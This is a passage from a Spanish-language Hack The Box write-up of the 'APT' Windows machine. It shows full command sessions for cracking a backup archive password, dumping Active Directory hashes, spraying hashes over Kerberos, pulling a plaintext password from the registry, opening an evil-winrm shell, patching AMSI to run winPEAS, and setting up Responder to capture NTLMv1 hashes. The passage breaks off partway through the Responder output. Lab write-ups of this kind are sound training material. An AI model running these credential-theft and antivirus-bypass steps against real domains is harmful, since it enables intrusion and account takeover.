ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>342, <span class="nv">decmplen</span><span class="o">=</span>16384, <span class="nv">crc</span><span class="o">=</span>2A393785 <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>2a39 <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8522, <span class="nv">decmplen</span><span class="o">=</span>262144, <span class="nv">crc</span><span class="o">=</span>9BEBC2C3 <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>9beb <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>2157644, <span class="nv">decmplen</span><span class="o">=</span>12582912, <span class="nv">crc</span><span class="o">=</span>65D9BFCD <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>65d9 <span class="nb">type</span><span class="o">=</span>8
NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
option <span class="nt">-o</span> to pick a file at a time.
➜  content <span class="nb">cat hash
</span>backup.zip:<span class="nv">$pkzip$4</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>65d9<span class="k">*</span>2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip<span class="nv">$:</span>:backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
</code></pre></div></div>

<ul>
  <li>Si lo crackeamos vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
iloveyousomuch   <span class="o">(</span>backup.zip<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-03-31 19:56<span class="o">)</span> 16.66g/s 136533p/s 136533c/s 136533C/s newzealand..whitetiger
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Y ahora si podemos usar <code class="language-plaintext highlighter-rouge">unzip</code> pasándole la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
  inflating: Active Directory/ntds.dit
  inflating: Active Directory/ntds.jfm
   creating: registry/
  inflating: registry/SECURITY
  inflating: registry/SYSTEM
</code></pre></div></div>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> ya que el <code class="language-plaintext highlighter-rouge">ntds</code> y el <code class="language-plaintext highlighter-rouge">SYSTEM</code> lo tenemos para dumpear <code class="language-plaintext highlighter-rouge">hashes</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="o">&gt;</span> hashes
</code></pre></div></div>

<ul>
  <li>Bueno tenemos 2000 usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hashes | <span class="nb">wc</span> <span class="nt">-l</span>
2000
</code></pre></div></div>

<ul>
  <li>Para validar usuarios validos del dominio podemos emplear le herramienta <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">--dc</span> apt <span class="nt">-d</span> htb.local <span class="nb">users

    </span>__             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/31/24 - Ronnie Flathers @ropnop

2024/03/31 20:13:04 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/03/31 20:13:04 <span class="o">&gt;</span>  	apt:88

2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
2024/03/31 20:17:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno tenemos un usuario valido que se llama <strong>henry.vinson</strong>.</p>
  </li>
  <li>
    <p>Si probamos obtener un TGT para el usuario que tenemos no funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> user_valid.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User henry.vinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que vamos hacer ahora es fuerza bruta para ver si de los hashes que tenemos alguno le corresponde al usuario.</p>
  </li>
  <li>
    <p>Pero hemos sido baneados.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> hashes
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
^C

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Shutting down, please wait...
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
</code></pre></div></div>

<h2 id="shell-as-henry_vinson_adm">Shell as henry_vinson_adm</h2>

<ul>
  <li>No podemos aplicar fuerza bruta por <strong>smb</strong> pero si por <code class="language-plaintext highlighter-rouge">kerberos</code> <a href="https://github.com/0xAnomaly/KerbSpray">https://github.com/0xAnomaly/KerbSpray</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  KerbSpray git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 KerbSpray.py htb.local henry.vinson apt.local.htb hashes
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Spraying Hashes...

<span class="o">[</span>i] Domain:             htb.local
<span class="o">[</span>i] Target User:        henry.vinson
<span class="o">[</span>i] Domain Controller:  apt.local.htb
<span class="o">[</span>+] Success htb.local/henry.vinson
<span class="o">[</span>+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>Ahora que tenemos el <strong>hash</strong> podemos comprobar si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> <span class="s1">'e53d87d42adaa3ca32bdb34a876cbffb'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos credenciales validas podemos intentar un <code class="language-plaintext highlighter-rouge">Kerberoasting attack</code> para solicitar tickets TGS <a href="https://ciberseguridad.com/amenzas/ataques-kerberoasting/">https://ciberseguridad.com/amenzas/ataques-kerberoasting/</a>.</p>
  </li>
  <li>
    <p>Pero bueno no tuvimos éxito.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers  htb.local/henry.vinson <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
</code></pre></div></div>

<ul>
  <li>Podemos listar registros de la maquina <a href="https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.">https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.</a> para esto podemos usar la herramienta de <code class="language-plaintext highlighter-rouge">impacket-reg</code> le tenemos que proporcionar un <strong>KeyName</strong> <a href="https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html">https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU<span class="se">\C</span>onsole
HKU<span class="se">\C</span>ontrol Panel
HKU<span class="se">\E</span>nvironment
HKU<span class="se">\K</span>eyboard Layout
HKU<span class="se">\N</span>etwork
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>ystem
HKU<span class="se">\V</span>olatile Environment
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver lo que hay en <code class="language-plaintext highlighter-rouge">Software</code>.</p>
  </li>
  <li>
    <p>Si miramos vemos que hay un <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code> y la pagina web de la maquina se llama GiganticHosting.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
HKU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
HKU<span class="se">\S</span>oftware<span class="se">\P</span>olicies
HKU<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
HKU<span class="se">\S</span>oftware<span class="se">\S</span>ysinternals
HKU<span class="se">\S</span>oftware<span class="se">\V</span>Mware, Inc.
HKU<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
HKU<span class="se">\S</span>oftware<span class="se">\C</span>lasses
</code></pre></div></div>

<ul>
  <li>Si vemos lo que hay encontramos un usuario nuevo y su contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software\GiganticHostingManagementSystem'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Ahora podemos validas las credenciales para ver si son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm htb.local <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
HTTP        apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://apt:5985/wsman
WINRM       apt             5985   APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt.local.htb <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> G1#Ny5@2dvht

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\h</span>enry.vinson_adm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>         4/1/2024   6:29 PM             34 user.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
d559647d74b6b9fe38018220d86e0a7e
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Después de enumerar no encontré mucho así que vamos a usar una herramienta famosa de reconocimiento <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
  </li>
  <li>
    <p>Pero bueno si lo ejecutamos vemos que el <strong>antivirus</strong> lo detecta y no se puede ejecuta por eso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/APT/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; .<span class="se">\W</span>inPEASx64.exe
Program <span class="s1">'winPEASx64.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Pero podemos hacer un <strong>Bypass</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; menu


   ,.   <span class="o">(</span>   <span class="nb">.</span>      <span class="o">)</span>               <span class="s2">"            ,.   (   .      )       .
  ("</span>  <span class="o">(</span>  <span class="o">)</span>  <span class="o">)</span><span class="s1">'     ,'</span>             <span class="o">(</span><span class="sb">`</span>     <span class="s1">'`    ("     )  )'</span>     ,<span class="s1">'   .  ,)
.; )  '</span> <span class="o">((</span> <span class="o">(</span><span class="s2">" )    ;(,      .     ;)  "</span>  <span class="o">)</span><span class="s2">"  .; )  ' (( ("</span> <span class="o">)</span>   <span class="o">)</span><span class="p">;</span><span class="o">(</span>,   <span class="o">)((</span>
_<span class="s2">".,_,.__).,) (.._( ._),     )  , (._..( '.._"</span>._, <span class="nb">.</span> <span class="s1">'._)_(..,_(_".) _( _'</span><span class="o">)</span>
<span class="se">\_</span>   _____/__  _|__|  |    <span class="o">((</span>  <span class="o">(</span>  /  <span class="se">\ </span>   /  <span class="se">\_</span>_| ____<span class="se">\_</span>_____   <span class="se">\ </span> /     <span class="se">\</span>
 |    __<span class="o">)</span>_<span class="se">\ </span> <span class="se">\/</span> /  |  |    <span class="p">;</span>_<span class="o">)</span>_<span class="s1">') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
</span></code></pre></div></div>

<ul>
  <li>Primero vamos a ejecutar el <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Bypass-4MSI

Info: Patching 4MSI, please be patient...

<span class="o">[</span>+] Success!
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usamos el <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> para que desde nuestro equipo se ejecute indicándole la ruta y lo estaríamos inyectando en memoria.</p>
  </li>
  <li>
    <p>Una vez que termine nos reportara todo el <code class="language-plaintext highlighter-rouge">output</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Invoke-Binary /home/miguel/Hackthebox/APT/content/winPEASx64.exe
</code></pre></div></div>

<ul>
  <li>Lo mas interesante es esto vemos que soporta <code class="language-plaintext highlighter-rouge">NTLMv1</code> y es criptografía débil.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    : 2 <span class="o">(</span>Send NTLM response only<span class="o">)</span>


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing <span class="o">(</span>Negotiate signing<span class="o">)</span>

  Session Security
      NTLMMinClientSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>
        <span class="o">[!]</span> NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>

        <span class="o">[!]</span> NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundRestrictions    :  <span class="o">(</span>Not defined<span class="o">)</span>
      InboundAuditing         :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundExceptions      :
</code></pre></div></div>

<ul>
  <li>
    <p>Algo que podemos hacer es robar el hash <strong>NTLMv1</strong> con el <code class="language-plaintext highlighter-rouge">responder</code> <a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a>.</p>
  </li>
  <li>
    <p>Primeramente necesitamos especificar el <strong>challenge</strong> en el archivo <code class="language-plaintext highlighter-rouge">/usr/share/responder/Responder.conf</code> .</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> Custom challenge.
<span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
<span class="c">#Challenge = Random</span>
Challenge <span class="o">=</span> 1122334455667788
<span class="p">;</span> SQLite Database file
<span class="p">;</span> Delete this file to re-capture previously captured hashes
Database <span class="o">=</span> Responder.db
</code></pre></div></div>

<ul>
  <li>Ahora desplegamos el <code class="language-plaintext highlighter-rouge">responder</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
